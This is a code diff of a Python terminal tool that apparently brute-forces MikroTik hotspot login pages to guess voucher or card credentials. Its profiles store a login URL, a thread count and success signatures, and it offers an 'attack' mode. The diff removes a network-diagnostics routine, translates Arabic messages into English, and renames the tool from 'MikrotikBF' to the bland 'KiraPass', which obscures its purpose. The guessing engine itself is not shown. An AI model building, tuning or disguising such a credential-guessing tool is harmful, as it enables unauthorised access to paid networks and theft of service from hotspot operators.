@@ -1242,70 +1089,6 @@ def _probe(p, n, threads_count, label):
     return stats, err_rate
 
 
-def diagnose_flow():
-    db = load_db()
-    p = choose_profile(db)
-    if p is None:
-        return
-
-    print(f'''{cyan}
- ┌─ Diagnostics (read-only, no guessing) ──────┐
- │ {gray}يرسل طلبات ببيانات خاطئة عمداً لقياس الحالة│
- │ {gray}الشبكية فقط: تأخير، أخطاء، رموز HTTP.      │
- │ {gray}لا يحاول أي كارت ولا يستهلك محاولات.       │{white}
-{cyan} └─────────────────────────────────────────────┘{white}''')
-
-    print(f'{yellow} ⟳ Reachability test...{white}')
-    t0 = time.time()
-    try:
-        r = test_connection(p['login_url'])
-        print(f'{green} ✓ HTTP {r.status_code} in '
-              f'{(time.time() - t0) * 1000:.0f} ms{white}')
-    except Exception as e:
-        kind, short = classify_error(e)
-        print(f'{red} ✗ Unreachable [{kind}]: {short}{white}')
-        print(f'{gray}   → {ERROR_HINTS.get(kind, "")}{white}')
-        print(f'{yellow}   لا فائدة من أي تخمين قبل إصلاح الوصول للرابط.{white}')
-        input(f'{gray} Enter to continue...{white}')
-        return
-
-    s1, r1 = _probe(p, 30, 1, 'A) Sequential — 1 thread / 30 requests')
-
-    default_t = int(p.get('threads', 20))
-    t = ask_int(f'{white} → Threads to compare against '
-                f'{green}(Enter={default_t}){white} : ',
-                default=default_t, minv=1, maxv=100)
-    s2, r2 = _probe(p, max(60, t * 3), t,
-                    f'B) Parallel — {t} threads / {max(60, t * 3)} requests')
-
-    print(f'\n {cyan}DIAGNOSIS{white}')
-    if s1['err'] == 0 and s2['err'] == 0:
-        print(f''' {green}✓ The link is clean at both settings.
-   أي أخطاء تراها في وضع الهجوم إذن ليست من الشبكة — راجع الرابط/الطريقة.{white}''')
-    elif r2 > r1 * 2 and r2 > 3:
-        rec = max(4, min(t // 2, 40))
-        print(f''' {yellow}▲ الأخطاء تزيد مع الـThreads ({r1:.1f}% → {r2:.1f}%).
-   هذا ضغط على الراوتر/الجهاز، وليس حظراً ولا كروت منتهية.
-   {t} → جرّب {rec} thread: السرعة الحقيقية غالباً لن تنقص
-   لأن الراوتر هو العنق، والأخطاء ستقل كثيراً.{white}''')
-    elif r1 > 3 and s1['err'] >= 3:
-        print(f''' {yellow}▲ الأخطاء موجودة حتى بـ thread واحد
-   ({r1:.1f}% = {s1["err"]} من {s1["n"]} طلب).
-   الشك هنا في المسار نفسه: واي فاي ضعيف، AP وسيط، أو الراوتر نفسه
-   تحت ضغط/RADIUS بطيء. تقليل الـThreads لن يحلّها.{white}''')
-    elif r1 > 3:
-        print(f''' {green}✓ خطأ أو اثنان بـ thread واحد
-   ({s1["err"]} من {s1["n"]}) = ضوضاء عادية، لا حكم منها.
-   الأخطاء تظهر مع التوازي ({r2:.1f}%) → ضغط على الراوتر لا حظر.{white}''')
-    else:
-        print(f' {green}✓ الفرق طبيعي: {r1:.1f}% → {r2:.1f}%.{white}')
-
-    if s2['kinds'].get('stale_keepalive'):
-        print(f' {gray}ملاحظة: {s2["kinds"]["stale_keepalive"]} من الأخطاء كانت '
-              f'اتصالات keep-alive قديمة (تُعاد تلقائياً) — أثرها صفر.{white}')
-    input(f'{gray} Enter to continue...{white}')
-
-
 def choose_profile(db):
     profiles = db['profiles']
     if not profiles:
@@ -1373,8 +1156,8 @@ def use_profile_flow():
     threads_count = ask_int(f'{white} → Threads {green}(Enter = saved){white} : ',
                             default=p.get('threads', 20), minv=1, maxv=100)
     if threads_count > 60:
-        print(f'{yellow} ⚠ {threads_count} threads على راوتر hotspot عادي = '
-              f'أخطاء أكثر وسرعة أقل. Menu 4 يقيس لك الفرق قبل الهجوم.{white}')
+        print(f'{yellow} ⚠ {threads_count} threads on an ordinary hotspot router = '
+              f'more errors and less speed. The diagnostics step measures it first.{white}')
     p['threads'] = threads_count
 
     if p.get('success_signature') or p.get('success_url'):
@@ -1403,14 +1186,14 @@ def create_profile_flow():
 
     keyword = ''
     if ask_yn(f'{yellow} → Teach me the SUCCESS page now? '
-              f'{gray}(بيانات صحيحة معروفة){white}', default_yes=False):
+              f'{gray}(known-good credentials){white}', default_yes=False):
         if learn_success_page(p):
             keyword = ''  
     if not keyword and not (p.get('success_signature') or p.get('success_url')):
         keyword = input(f'{white} → Success Keyword {green}(Enter = status){white} : ').strip() or 'status'
     p['keyword'] = keyword
 
-    if ask_yn(f'{yellow} → Run diagnostics before attacking? {gray}(موصى به)',
+    if ask_yn(f'{yellow} → Run diagnostics before attacking? {gray}(recommended)',
               default_yes=True):
         _probe(p, 30, 1, 'A) Sequential — 1 thread / 30 requests')
         _probe(p, max(60, p['threads'] * 3), p['threads'],
@@ -1424,7 +1207,7 @@ def create_profile_flow():
             name = input(f'{white} → Profile name {green}(Enter = {suggested}){white} : ').strip() or suggested
             if name not in names:
                 break
-            print(f'{red} ✗ الاسم مستخدم، اختر اسماً آخر.{white}')
+            print(f'{red} ✗ That name is already used, choose another one.{white}')
         p['name'] = name
         p['created'] = datetime.now().strftime('%Y-%m-%d %H:%M')
         p['last_used'] = p['created']
@@ -1468,7 +1251,7 @@ def main():
     clear_screen()
     print(f'''{green}
   ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-{white}   MikrotikBF v3.2
+{white}   KiraPass v3.2
 {white}   Developer : ENG.YOUSEF
 {green}  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■{gray}{green}
 ''')
